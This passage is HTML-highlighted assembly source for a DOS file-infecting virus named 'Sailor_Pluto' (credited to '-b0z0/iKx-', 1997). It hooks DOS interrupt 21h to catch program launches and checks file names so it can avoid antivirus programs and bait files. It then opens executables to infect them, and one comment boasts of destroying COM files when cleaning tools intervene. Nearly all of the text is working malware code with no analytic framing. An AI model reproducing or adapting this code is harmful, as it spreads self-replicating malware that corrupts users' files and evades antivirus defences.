                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">07h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; restore sp</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">05h</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; modify ss</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">09h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; push victim cs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">0bh</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; push victim ip</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">                          </span><span class="sc1">; return on original cs:ip</span><span class="sc0">

</span><span class="sc5">infip</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00000h</span><span class="sc0">
</span><span class="sc5">infcs</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0fff0h</span><span class="sc0">

</span><span class="sc5">infsp</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">infss</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">old_jump</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">           </span><span class="sc1">; original first 3 bytes</span><span class="sc0">
</span><span class="sc5">isexe</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">                     </span><span class="sc1">; 00h=exe, 01=com</span><span class="sc0">
</span><span class="sc5">old_two_rnd</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                 </span><span class="sc1">; original random word</span><span class="sc0">

</span><span class="sc5">virus_name</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Sailor_Pluto'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">virus_author</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'-b0z0/iKx-'</span><span class="sc0">

</span><span class="sc5">do_original_21h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; does a call to the</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">orig_21h</span><span class="sc0">   </span><span class="sc1">; original (if got) int 21h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">orig_21h</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">realcom</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; .COM file restore</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; ax = begin of com in mem</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">          </span><span class="sc1">; si = where to start checking</span><span class="sc0">

</span><span class="sc5">search_loop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc12">'PS'</span><span class="sc0">   </span><span class="sc1">; search for changed word</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">search_loop</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; original word</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; Be sure that TBClean</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; and such like will</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc0">                      </span><span class="sc1">; permanently destroy</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; the COM file :-)</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; restore changed word</span><span class="sc0">

                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; old three bytes</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; needed for some old DOS coms</span><span class="sc0">

                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">; put original 3 bytes</span><span class="sc0">
                </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; jump at cs:100</span><span class="sc0">

</span><span class="sc5">int21_handler</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1818h</span><span class="sc0">               </span><span class="sc1">; installation check</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">acheck</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'SP'</span><span class="sc0">                </span><span class="sc1">; Sailor_Pluto responses</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">notinst</span><span class="sc0">
        </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">acheck</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">004bh</span><span class="sc0">               </span><span class="sc1">; program execution</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">execute</span><span class="sc0">

</span><span class="sc5">goint21</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">old_int21_off</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">old_int21_seg</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">origin</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'PADANIA - 1997'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">execute</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">19h</span><span class="sc0">          </span><span class="sc1">; don't infect on floppyes</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">ok_disk</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">restore_registers</span><span class="sc0">
</span><span class="sc5">ok_disk</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0"> 
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3524h</span><span class="sc0">          </span><span class="sc1">; get int24h seg and off</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24_off</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">; store them</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">old_int24_seg</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int24h</span><span class="sc0">          </span><span class="sc1">; our int24h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2524h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">sloop</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">; ds:di-&gt; filename</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">sloop</span><span class="sc0">                   </span><span class="sc1">; search for '.'</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">sloop</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">look_sla</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">ok_name_let</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'9'</span><span class="sc0">                  </span><span class="sc1">; numeric in name?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">exit_from_here</span><span class="sc0">
</span><span class="sc5">ok_name_let</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'\'                  ; search for \
</span><span class="sc13">                jne     look_sla
</span><span class="sc0">                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">antiviruses</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'V'</span><span class="sc0">          </span><span class="sc1">; probable bait or AV software</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_from_here</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exec_letter</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; similar names?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">exit_from_here</span><span class="sc0">
</span><span class="sc5">avcloop</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">notav</span><span class="sc0">
</span><span class="sc5">exit_from_here</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">stc</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">endscan</span><span class="sc0">
</span><span class="sc5">notav</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">; next av signature</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">    </span><span class="sc1">; end of the checked sigs?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">endscan</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">avcloop</span><span class="sc0">
</span><span class="sc5">endscan</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">bogus</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">oh_shit2</span><span class="sc0">
</span><span class="sc5">bogus</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">exec_letter</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">    </span><span class="sc1">; store 2 letters</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_attr</span><span class="sc0">

                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">file_writeable</span><span class="sc0">
</span><span class="sc5">exiting</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">oh_shit</span><span class="sc0">
</span><span class="sc5">file_writeable</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                </span><span class="sc1">; open for rw</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exiting</span><span class="sc0">
</span><span class="sc5">ahead</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; bx file handle as usual</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc1">; file lenght check</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                          </span><span class="sc1">; lseek at end</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">movefile</span><span class="sc0">

                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">leave_ax_check</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1388h</span><span class="sc0">                        </span><span class="sc1">; AX = 5000?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">     </span><span class="sc5">set_marker</span><span class="sc0">

</span><span class="sc5">leave_ax_check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1000d</span><span class="sc0">                        </span><span class="sc1">; divisible by 1000</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">set_marker</span><span class="sc0">

                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1ffh</span><span class="sc0">                         </span><span class="sc1">; divisible by 1024</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">oki_lenght_chk</span><span class="sc0">
</span><span class="sc5">set_marker</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">oh_shit</span><span class="sc0">
</span><span class="sc5">oki_lenght_chk</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">; read date/time</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">                </span><span class="sc1">; get system date</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1980</span><span class="sc0">               </span><span class="sc1">; prepare for compare</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">07</span><span class="sc0">
                </span><span class="sc6">rol</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                 
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">07fh</span><span class="sc0">               </span><span class="sc1">; DX = years from 1980</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">different_year</span><span class="sc0">        </span><span class="sc1">; away if year is different</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                </span><span class="sc1">; get just month</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">closing</span><span class="sc0">               </span><span class="sc1">; exit if month is current</span><span class="sc0">

</span><span class="sc5">different_year</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">movefile</span><span class="sc0">              </span><span class="sc1">; go at file start</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                </span><span class="sc1">; read 200h bytes from file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">exeheader</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_original_21h</span><span class="sc0">

